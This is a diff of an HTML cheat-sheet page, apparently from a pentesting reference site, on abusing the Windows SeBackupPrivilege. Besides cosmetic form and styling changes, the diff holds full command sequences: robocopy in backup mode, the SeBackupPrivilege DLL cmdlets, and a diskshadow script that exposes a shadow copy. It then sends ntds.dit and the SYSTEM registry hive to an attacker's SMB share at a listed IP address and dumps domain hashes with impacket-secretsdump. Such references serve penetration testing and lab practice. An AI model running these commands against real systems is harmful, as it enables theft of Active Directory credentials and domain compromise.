@@ -199,23 +199,146 @@
   <li><a href="https://tldrbins.github.io/@secretsdump/">Secretsdump</a></li>
   
 </ul>
+<hr>
+<div class="content">
+<div id="params">
+	<form id="params_form" style="display: none;">
+	</form>
+	<div class="center">
+		<button id="form_btn">Show Params Form</button>
+		<button id="replace_btn" style="display: none;">Replace Params</button>
+		<button id="reset_btn" style="display: none;">Reset</button>
+		<button id="clear_btn" style="display: none;">Clear Cache</button>
+	</div>
+</div>
 
-<div class="content"><hr>
+<style>
+#params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: white;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #aaa;
+	font-family: system-ui;
+}
+
+#params * {
+    box-sizing: border-box;
+}
+
+#params input {
+  margin-bottom: 15px;
+}
+
+#params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #f5f5f5;
+}
+
+#params label {
+	color: #333333;
+	font-size: 0.9rem;
+}
+
+#params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #f5f5f5;
+	font-weight: 700;
+	background: rgba(44, 82, 179);
+}
+
+#params button:hover {
+    cursor: pointer;
+    background: rgba(44, 82, 179, 0.95);
+}
+
+.center {
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+
+ 
+body.dark-mode #params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: #23272a;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #23272a;
+	font-family: system-ui;
+}
+
+body.dark-mode #params * {
+    box-sizing: border-box;
+}
+
+body.dark-mode #params input {
+	border-radius: 0.2em;
+	border: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input:focus {
+	margin-bottom: 15px;
+	outline: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #bdbdbd;
+}
+
+body.dark-mode #params label {
+	color: #fafafa;
+	font-size: 0.9rem;
+}
+
+body.dark-mode #params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #fafafa;
+	font-weight: 700;
+	background: #616161;
+}
+
+body.dark-mode #params button:hover {
+    cursor: pointer;
+    background: #424242;
+}
+
+
+</style>
 <h3 id="abuse-1-robocopy">Abuse #1: Robocopy</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># For example</span>
-</span></span><span class="line"><span class="cl"><span class="n">robocopy</span> <span class="p">/</span><span class="n">b</span> <span class="p">&lt;</span><span class="n">TARGET_DIR_PATH</span><span class="p">&gt;</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Tasks</span> <span class="p">&lt;</span><span class="n">TARGET_FILE</span><span class="p">&gt;</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> For example
+</span></span><span class="line"><span class="cl"><span class="go">robocopy /b &lt;TARGET_DIR_PATH&gt; C:\Windows\Tasks &lt;TARGET_FILE&gt;
+</span></span></span></code></pre></div></div>
 <br>
 <hr>
 <h3 id="abuse-2-using-helper-dlls">Abuse #2: Using helper dlls</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">import-module</span> <span class="p">.\</span><span class="n">SeBackupPrivilegeCmdLets</span><span class="p">.</span><span class="py">dll</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">import-module</span> <span class="p">.\</span><span class="n">SeBackupPrivilegeUtils</span><span class="p">.</span><span class="py">dll</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Copy-FileSeBackupPrivilege</span> <span class="p">&lt;</span><span class="n">TARGET_FILE_PATH</span><span class="p">&gt;</span> <span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\&lt;</span><span class="n">TARGET_FILE</span><span class="p">&gt;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># For example</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Copy-FileSeBackupPrivilege</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">ntds</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="py">dit</span> <span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="py">dit</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">import-module .\SeBackupPrivilegeCmdLets.dll
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">import-module .\SeBackupPrivilegeUtils.dll
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Copy-FileSeBackupPrivilege &lt;TARGET_FILE_PATH&gt; C:\ProgramData\&lt;TARGET_FILE&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> For example
+</span></span><span class="line"><span class="cl"><span class="go">Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit C:\ProgramData\ntds.dit
+</span></span></span></code></pre></div></div>
 <p><small><em>Ref: <a href="https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll?raw=true">SeBackupPrivilegeUtils.dll</a></em></small>
 <br>
 <small><em>Ref: <a href="https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll?raw=true">SeBackupPrivilegeCmdLets.dll</a></em></small></p>
@@ -224,38 +347,39 @@
 <h3 id="abuse-3-diskshadow">Abuse #3: Diskshadow</h3>
 <h4 id="1-create-a-dsh-file">1. Create a .dsh file</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">set</span> context persistent nowriters
-</span></span><span class="line"><span class="cl"><span class="nb">set</span> metadata C:<span class="se">\P</span>rogramData<span class="se">\t</span>est.cab
-</span></span><span class="line"><span class="cl"><span class="nb">set</span> verbose on
-</span></span><span class="line"><span class="cl">add volume c: <span class="nb">alias</span> <span class="nb">test</span>
-</span></span><span class="line"><span class="cl">create
-</span></span><span class="line"><span class="cl">expose %test% x:
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">set context persistent nowriters
+</span></span></span><span class="line"><span class="cl"><span class="go">set metadata C:\ProgramData\test.cab
+</span></span></span><span class="line"><span class="cl"><span class="go">set verbose on
+</span></span></span><span class="line"><span class="cl"><span class="go">add volume c: alias test
+</span></span></span><span class="line"><span class="cl"><span class="go">create
+</span></span></span><span class="line"><span class="cl"><span class="go">expose %test% x:
+</span></span></span></code></pre></div></div>
 <br>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Convert to dos format</span>
-</span></span><span class="line"><span class="cl">unix2dos vss.dsh
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Convert to dos format
+</span></span><span class="line"><span class="cl"><span class="go">unix2dos vss.dsh
+</span></span></span></code></pre></div></div>
 <h4 id="2-run-vssdsh">2. Run vss.dsh</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Upload and run</span>
-</span></span><span class="line"><span class="cl"><span class="n">diskshadow</span> <span class="p">/</span><span class="n">s</span> <span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">vss</span><span class="p">.</span><span class="py">dsh</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Upload and run
+</span></span><span class="line"><span class="cl"><span class="go">diskshadow /s C:\ProgramData\vss.dsh
+</span></span></span></code></pre></div></div>
 <h4 id="3-host-a-smb-server-in-linux">3. Host a smb server (In Linux)</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-smbserver share . -smb2support
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-smbserver share . -smb2support
+</span></span></span></code></pre></div></div>
 <h4 id="4-copy-to-local-linux">4. Copy to local Linux</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">net use <span class="se">\\</span>10.10.14.10<span class="se">\s</span>hare
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Copy-FileSeBackupPrivilege x:<span class="se">\W</span>indows<span class="se">\n</span>tds<span class="se">\n</span>tds.dit <span class="se">\\</span>10.10.14.10<span class="se">\s</span>hare<span class="se">\n</span>tds.dit
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">reg.exe save hklm<span class="se">\s</span>ystem <span class="se">\\</span>10.10.14.10<span class="se">\s</span>hare<span class="se">\s</span>ystem
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">net use \\&lt;LOCAL_IP&gt;\share
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Copy-FileSeBackupPrivilege x:\Windows\ntds\ntds.dit \\&lt;LOCAL_IP&gt;\share\ntds.dit
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">reg.exe save hklm\system \\&lt;LOCAL_IP&gt;\share\system
+</span></span></span></code></pre></div></div>
 <h4 id="5-secrets-dump">5. Secrets dump</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-secretsdump -ntds ntds.dit -system system LOCAL
-</span></span></code></pre></div></div>
-<br></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-secretsdump -ntds ntds.dit -system system LOCAL
+</span></span></span></code></pre></div></div>
+<br>
+</div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
